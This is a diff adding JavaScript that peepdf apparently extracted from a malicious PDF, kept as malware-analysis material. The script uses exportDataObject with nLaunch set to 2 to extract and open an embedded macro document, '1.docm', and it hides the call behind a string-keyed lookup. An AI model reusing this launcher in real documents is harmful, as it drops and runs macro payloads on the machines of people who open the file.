@@ -1,0 +1,16 @@
+// peepdf comment: Javascript code located in object 16 (version 0)
+
+taxomonials();
+
+// peepdf comment: Javascript code located in object 17 (version 0)
+
+function taxomonials() {
+    var originalDataArray = {};
+    originalDataArray['nLaunch'] = 2;
+
+    originalDataArray['cName'] = '1.docm';
+
+    originalDataArray['r2'] = 'exportDataObject';
+    this[originalDataArray['r2']](originalDataArray);
+}
+
